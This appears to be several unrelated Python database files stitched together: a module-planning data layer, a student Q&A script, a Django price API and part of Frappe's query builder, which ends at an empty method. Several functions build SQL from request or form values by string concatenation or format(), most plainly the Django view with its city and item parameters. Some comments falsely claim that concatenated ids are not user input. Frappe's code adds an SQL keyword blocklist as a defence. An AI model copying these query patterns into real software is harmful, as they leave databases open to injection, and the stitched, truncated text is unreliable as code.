def get_quota_of_target_tenta_ay_sem(code, ay_sem):
    '''
        Get the quota of a mod in a target tentative AY/Sem (if any)
    '''
    sql_command = "SELECT quota FROM moduleMountTentative " +\
                  "WHERE moduleCode=%s AND acadYearAndSem=%s "
    DB_CURSOR.execute(sql_command, (code, ay_sem))
    return DB_CURSOR.fetchall()


def get_number_students_planning(code):
    '''
        Get the number of students planning to take a mounted module
    '''
    sql_command = "SELECT COUNT(*), acadYearAndSem FROM studentPlans WHERE " +\
                    "moduleCode=%s GROUP BY acadYearAndSem ORDER BY acadYearAndSem"
    DB_CURSOR.execute(sql_command, (code, ))
    return DB_CURSOR.fetchall()


def add_module(code, name, description, module_credits, status):
    '''
        Insert a module into the module table.
        Returns true if successful, false if duplicate primary key detected
    '''
    sql_command = "INSERT INTO module VALUES (%s,%s,%s,%s,%s)"
    try:
        DB_CURSOR.execute(sql_command, (code, name, description, module_credits, status))
        CONNECTION.commit()
    except psycopg2.IntegrityError:        # duplicate key error
        CONNECTION.rollback()
        return False
    return True


def update_module(code, name, description, module_credits):
    '''
        Update a module with edited info
    '''
    sql_command = "UPDATE module SET name=%s, description=%s, mc=%s " +\
                  "WHERE code=%s"
    try:
        DB_CURSOR.execute(sql_command, (name, description, module_credits, code))
        CONNECTION.commit()
    except psycopg2.Error:
        CONNECTION.rollback()
        return False
    return True


def flag_module_as_removed(code):
    '''
        Change the status of a module to 'To Be Removed'
    '''
    sql_command = "UPDATE module SET status='To Be Removed' WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code, ))
    CONNECTION.commit()


def flag_module_as_active(code):
    '''
        Change the status of a module to 'Active'
    '''
    sql_command = "UPDATE module SET status='Active' WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code, ))
    CONNECTION.commit()


def delete_module(code):
    '''
        Delete a module from the module table
    '''
    # Delete the foreign key reference first.
    sql_command = "DELETE FROM modulemounted WHERE modulecode=%s"
    DB_CURSOR.execute(sql_command, (code,))

    # Perform the normal delete.
    sql_command = "DELETE FROM module WHERE code=%s"
    DB_CURSOR.execute(sql_command, (code,))
    CONNECTION.commit()


def get_oversub_mod():
    '''
        Retrieves a list of modules which are oversubscribed.
        Returns module, AY/Sem, quota, number students interested
        i.e. has more students interested than the quota
    '''
    list_of_oversub_with_info = []
    list_all_mod_info = get_all_modules()

    for module_info in list_all_mod_info:
        mod_code = module_info[0]

        aysem_quota_fixed_list = get_fixed_mounting_and_quota(mod_code)
        aysem_quota_tenta_list = get_tenta_mounting_and_quota(mod_code)
        aysem_quota_merged_list = aysem_quota_fixed_list + \
                                aysem_quota_tenta_list

        num_student_plan_aysem_list = get_number_students_planning(mod_code)
        for num_plan_aysem_pair in num_student_plan_aysem_list:
            num_student_planning = num_plan_aysem_pair[0]
            ay_sem = num_plan_aysem_pair[1]
            real_quota = get_quota_in_aysem(ay_sem, aysem_quota_merged_list)

            # ensures that quota will be a number which is not None
            if real_quota is None:
                quota = 0
                real_quota = '?'
            else:
                quota = real_quota

            if num_student_planning > quota:
                oversub_info = (mod_code, ay_sem, real_quota, num_student_planning)
                list_of_oversub_with_info.append(oversub_info)

    return list_of_oversub_with_info


def get_quota_in_aysem(ay_sem, aysem_quota_merged_list):
    '''
        This is a helper function.
        Retrieves the correct quota from ay_sem listed inside
        aysem_quota_merged_list parameter.
    '''
    for aysem_quota_pair in aysem_quota_merged_list:
        aysem_in_pair = aysem_quota_pair[0]
        if ay_sem == aysem_in_pair:
            quota_in_pair = aysem_quota_pair[1]

            return quota_in_pair

    return None # quota not found in list


def add_admin(username, salt, hashed_pass):
    '''
        Register an admin into the database.
        Note: to change last argument to false once
        activation done
    '''
    sql_command = "INSERT INTO admin VALUES (%s, %s, %s, FALSE, TRUE)"
    DB_CURSOR.execute(sql_command, (username, salt, hashed_pass))
    CONNECTION.commit()


def is_userid_taken(userid):
    '''
        Retrieves all account ids for testing if a user id supplied
        during account creation
    '''
    sql_command = "SELECT staffid FROM admin WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (userid,))

    result = DB_CURSOR.fetchall()
    return len(result) != 0


def delete_admin(username):
    '''
        Delete an admin from the database.
    '''
    # Delete the foreign key references first.
    sql_command = "DELETE FROM starred WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (username,))

    sql_command = "DELETE FROM admin WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (username,))
    CONNECTION.commit()


def validate_admin(username, unhashed_pass):
    '''
        Check if a provided admin-password pair is valid.
    '''
    sql_command = "SELECT salt, password FROM admin WHERE staffID=%s"
    DB_CURSOR.execute(sql_command, (username,))
    admin = DB_CURSOR.fetchall()
    if not admin:
        return False
    else:
        hashed_pass = hashlib.sha512(unhashed_pass + admin[0][0]).hexdigest()
        is_valid = (admin[0][1] == hashed_pass)
        return is_valid


def add_fixed_mounting(code, ay_sem, quota):
    '''
        Insert a new mounting into fixed mounting table
    '''
    try:
        sql_command = "INSERT INTO modulemounted VALUES (%s,%s,%s)"
        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))
        CONNECTION.commit()
    except psycopg2.IntegrityError:        # duplicate key error
        CONNECTION.rollback()
        return False
    return True


def delete_fixed_mounting(code, ay_sem):
    '''
        Delete a mounting from the fixed mounting table
    '''
    sql_command = "DELETE FROM modulemounted WHERE moduleCode=%s AND acadYearAndSem=%s"
    DB_CURSOR.execute(sql_command, (code, ay_sem))
    CONNECTION.commit()


def add_tenta_mounting(code, ay_sem, quota):
    '''
        Insert a new mounting into tentative mounting table
    '''
    try:
        sql_command = "INSERT INTO moduleMountTentative VALUES (%s,%s,%s)"
        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))
        CONNECTION.commit()
    except psycopg2.IntegrityError:        # duplicate key error
        CONNECTION.rollback()
        return False
    return True


def update_quota(code, ay_sem, quota):
    '''
        Update the quota of a module in a target tentative AY/Sem
    '''
    sql_command = "UPDATE moduleMountTentative SET quota=%s " +\
                  "WHERE moduleCode=%s AND acadYearAndSem=%s"
    try:
        DB_CURSOR.execute(sql_command, (quota, code, ay_sem))
        CONNECTION.commit()
    except psycopg2.Error:
        CONNECTION.rollback()
        return False
    return True


def delete_tenta_mounting(code, ay_sem):
    '''
        Delete a mounting from the tentative mounting table
    '''
    sql_command = "DELETE FROM moduleMountTentative WHERE moduleCode=%s AND acadYearAndSem=%s"
    try:
        DB_CURSOR.execute(sql_command, (code, ay_sem))
        CONNECTION.commit()
    except psycopg2.Error:
        CONNECTION.rollback()
        return False
    return True


def get_num_students_by_yr_study():
    '''
        Retrieves the number of students at each year of study as a table
        Each row will contain (year, number of students) pair.
        e.g. [(1, 4), (2, 3)] means four year 1 students
        and two year 3 students
    '''
    INDEX_FIRST_ELEM = 0

    sql_command = "SELECT year, COUNT(*) FROM student GROUP BY year" + \
        " ORDER BY year"
    DB_CURSOR.execute(sql_command)                    

    table_with_non_zero_students = DB_CURSOR.fetchall()
    final_table = append_missing_year_of_study(table_with_non_zero_students)

    # Sort the table based on year
    final_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])

    return final_table


def append_missing_year_of_study(initial_table):
    '''
        Helper function to append missing years of study to the
        given initial table.
        initial_table given in lists of (year, number of students)
        pair.
        e.g. If year 5 is missing from table, appends (5,0) to table
        and returns the table
    '''
    MAX_POSSIBLE_YEAR = 6
    for index in range(0, MAX_POSSIBLE_YEAR):
        year = index + 1
        year_exists_in_table = False

        for year_count_pair in initial_table:
            req_year = year_count_pair[0]
            if req_year == year:
                year_exists_in_table = True
                break

        if not year_exists_in_table:
            initial_table.append((year, 0))

    return initial_table


def get_num_students_by_focus_area_non_zero():
    '''
        Retrieves the number of students for each focus area as a table,
        if no student is taking that focus area, that row will not be
        returned.
        Each row will contain (focus area, number of students) pair.
        See: get_num_students_by_focus_areas() for more details.
    '''
    sql_command = "SELECT f.name, COUNT(*) FROM focusarea f, takesfocusarea t" + \
        " WHERE f.name = t.focusarea1 OR f.name = t.focusarea2 GROUP BY f.name"
    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchall()


def get_focus_areas_with_no_students_taking():
    '''
        Retrieves a list of focus areas with no students taking.
    '''
    sql_command = "SELECT f2.name FROM focusarea f2 WHERE NOT EXISTS(" + \
        "SELECT f.name FROM focusarea f, takesfocusarea t " + \
        "WHERE (f.name = t.focusarea1 OR f.name = t.focusarea2) " + \
        "AND f2.name = f.name GROUP BY f.name)"
    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchall()


def get_number_students_without_focus_area():
    '''
        Retrieves the number of students who have not indicated their focus
        area.
    '''
    sql_command = "SELECT COUNT(*) FROM takesfocusarea WHERE " + \
        "focusarea1 IS NULL AND focusarea2 IS NULL"
    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchone()


def get_num_students_by_focus_areas():
    '''
        Retrieves the number of students for each focus area as a table
        Each row will contain (focus area, number of students) pair
        e.g. [(AI, 4), (Database, 3)] means four students taking AI as
        focus area and three students taking database as focus area.
        Note: A student taking double focus on AI and Database will be
        reflected once for AI and once for database (i.e. double counting)
    '''
    INDEX_FIRST_ELEM = 0

    table_with_non_zero_students = get_num_students_by_focus_area_non_zero()
    table_with_zero_students = get_focus_areas_with_no_students_taking()

    temp_table = table_with_non_zero_students

    # Loops through all focus areas with no students taking and add them to
    # the table with (focus area, number of students) pair.
    for focus_area_name in table_with_zero_students:
        temp_table.append((focus_area_name[INDEX_FIRST_ELEM], 0))

    # Sort the table based on focus area
    temp_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])

    # Build the final table with info of students without focus area.
    num_students_without_focus = \
    get_number_students_without_focus_area()[INDEX_FIRST_ELEM]

    temp_table.insert(INDEX_FIRST_ELEM,
                      ("Have Not Indicated", num_students_without_focus))
    final_table = temp_table

    return final_table

def get_mod_taken_together_with(code):
    '''
        Retrieves the list of modules taken together with the specified
        module code in the same semester.

        Returns a table of lists (up to 10 top results). Each list contains
        (specified code, module code of mod taken together, aySem, number of students)

        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students
        taking CS1010 and CS1231 together in AY 16/17 Sem 1.
    '''
    NUM_TOP_RESULTS_TO_RETURN = 10

    sql_command = "SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) " + \
                "FROM studentPlans sp1, studentPlans sp2 " + \
                "WHERE sp1.moduleCode = '" + code + "' AND " + \                    
                "sp2.moduleCode <> sp1.moduleCode AND " + \
                "sp1.studentId = sp2.studentId AND " + \
                "sp1.acadYearAndSem = sp2.acadYearAndSem " + \
                "GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem " + \
                "ORDER BY COUNT(*) DESC"

    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchmany(NUM_TOP_RESULTS_TO_RETURN)

def get_all_mods_taken_together():
    '''
        Retrieves the list of all modules taken together in the same semester.

        Returns a table of lists. Each list contains
        (module code 1, module code 2, aySem, number of students)
        where module code 1 and module code 2 are the 2 mods taken together
        in the same semester.

        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students
        taking CS1010 and CS1231 together in AY 16/17 Sem 1.
    '''

    sql_command = "SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) " + \
                "FROM studentPlans sp1, studentPlans sp2 " + \
                "WHERE sp1.moduleCode < sp2.moduleCode AND " + \
                "sp1.studentId = sp2.studentId AND " + \
                "sp1.acadYearAndSem = sp2.acadYearAndSem " + \
                "GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem " + \
                "ORDER BY COUNT(*) DESC"

    DB_CURSOR.execute(sql_command)                    

    return DB_CURSOR.fetchall()

#!/usr/local/bin/python2.7

'''
Author: Samantha Voigt
Last Modified: 4/19/16
answerQuestions.py

TODO: Write a description of the file

TODO: sort by timestamp                    

'''

import MySQLdb
import dbconn2

USER = 'svoigt'


def makeQuestionSelect(database): 
	conn = dbConnect(database)
	curs = conn.cursor(MySQLdb.cursors.DictCursor) # results as Dictionaries
	statement = "SELECT * FROM questions WHERE status='not-started' OR status='in-progress' ORDER BY ts DESC;"
	curs.execute(statement)                    
	lines = []
	while True:
		row = curs.fetchone()
		if row == None: 
			lines.append("<input type='submit' name=questionSubmit value='Answer Selected Question'>")
			return "\n".join(lines)
		
		lines.append("<div style='border:2px solid black;'><input type='radio' name='q_selection' value={id}> Question: {question}\n<p>Status: {status}\n<p>Time submitted: {ts}".format(id=row['id'], question=row['question'], status=row['status'], ts=row['ts']))
		if row['status'] == 'in-progress': 
			lines.append("<p>In-Progress Answer: {curr_answer}".format(curr_answer=row['answer']))
		lines.append("</div>")

def makeAnswerForm(database, id): 
	conn = dbConnect(database)
	curs = conn.cursor(MySQLdb.cursors.DictCursor)
	statement = "SELECT * FROM questions WHERE id=" + id # came from the form, not user input
	curs.execute(statement)                    
	row = curs.fetchone()
	if row: # only one result
		s = "<p>Question: {q}<br><br>".format(q=row['question'])
		s += "DO NOT CHANGE: <input type=text name='id' value={id}>".format(id=row['id'])
		s += "<label for='answer'>Answer:</label><br>"
		if row['status'] == 'in-progress': 
			s += "<textarea name='answer' cols='40' rows='5'>{ans}</textarea><br>".format(ans=row['answer'])
		else: 
			s += "<textarea name='answer' cols='40' rows='5'></textarea><br>"
		s += "<input type='submit' name='save' value='Save'><input type='submit' name='publish' value='Publish'>"
		return s
	else: 
		return "ERROR: couldn't find selected question in the database" # shouldn't happen


def updateAnswer(database, q_id, answer, update_type): 
	'''
	Adds the provided question to the questions table in the given database. 
	'''
	conn = dbConnect(database)
	curs = conn.cursor(MySQLdb.cursors.DictCursor)
	statement = "SELECT * FROM questions WHERE id=" + q_id # won't come from the user                    
	curs.execute(statement)                    
	row = curs.fetchone() # only one result
	timestamp = row['ts']
	# timestamp automatically changes on update - so you have to replace it with the old value

	if update_type == 'publish':
		statement = "update questions set status='completed', answer=%s, ts=%s where id=%s"
		# change the status to completed
	if update_type == 'save': 
		statement = "update questions set status='in-progress', answer=%s, ts=%s where id=%s"
		# change the status to in-progress

	curs.execute(statement, (answer, timestamp, q_id))


def dbConnect(database): 
	''' 
	Connects to the provided database using my cnf file and returns the connection
	'''
	dsn = dbconn2.read_cnf('/students/' + USER + '/.my.cnf')
	dsn['db'] = database
	conn = dbconn2.connect(dsn)
	return conn


from itemPrices.models import ItemSale
from django.db import connection
from django.db.models import Count
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status


NOT_FOUND_JSON_RESPONSE = {
    'status': 404,
    'content': {
        'message': 'Not found',
    }
}


class ItemPriceService(APIView):
    """
    """
    def get(self, request):
        item = request.query_params.get('item')
        city = request.query_params.get('city')

        # If item and city are both excluded from the request, return
        # a json blob with a status of 404.
        if not item and not city:
            return Response(NOT_FOUND_JSON_RESPONSE)

        # Raw SQL using built-in mode() function within postgres
        # Returns a single row with the highest most frequent list price and
        # count of items found for the given search parameters.
        sql = '''SELECT                    
                    mode() WITHIN GROUP (ORDER BY list_price DESC) AS model_value,                    
                    count(*)                    
                 FROM                    
                    "itemPrices_itemsale"                    
              '''
        if item and city:                    
            sql = "{} WHERE city = '{}' and title = '{}'".format(sql, city, item)                    
        elif item:                    
            sql = "{} WHERE title = '{}'".format(sql, item)                    
        elif city:                    
            sql = "{} WHERE city = '{}'".format(sql, city)                    

        with connection.cursor() as c:                    
            c.execute(sql)                    
            price_mode, count = c.fetchone()                    

        # More traditional django ORM route of doing the above.
        # The above seems to be slightly faster, based on the
        # throughput I observed in jmeter, but is database specific.
        # Adding caching and reworking the ORM query might be a better
        # choice moving forward.

        # query = ItemSale.objects
        # if item:
        #     query = query.filter(title__startswith=item)
        # if city:
        #     query = query.filter(city=city)

        # # Get total item count for given parameters.
        # count = query.count()

        # Find list_price mode for given parameters.
        # query = query.order_by('list_price').values('list_price').annotate(price_count=Count('list_price'))
        # price_mode = query.order_by('-price_count', '-list_price').first()
        # if price_mode:
        #     price_mode = price_mode.get('list_price')

        # If we didn't find anything, return 404 response, just as if item and
        # city weren't passed in.
        if count == 0:
            return Response(NOT_FOUND_JSON_RESPONSE)

        return Response({
            'status': 200,
            'content': {
                'item': item or 'Not specified',
                'item_count': count,
                'price_suggestion': price_mode,
                'city': city or 'Not specified',
            }
        })



# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)                    

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''
		regex = re.compile('^.*[,();].*')                    
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)

		for field in self.fields:
			if regex.match(field):                    
				if any(keyword in field.lower() for keyword in blacklisted_keywords):                    
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() \                    
					for keyword in blacklisted_functions):                    
					_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
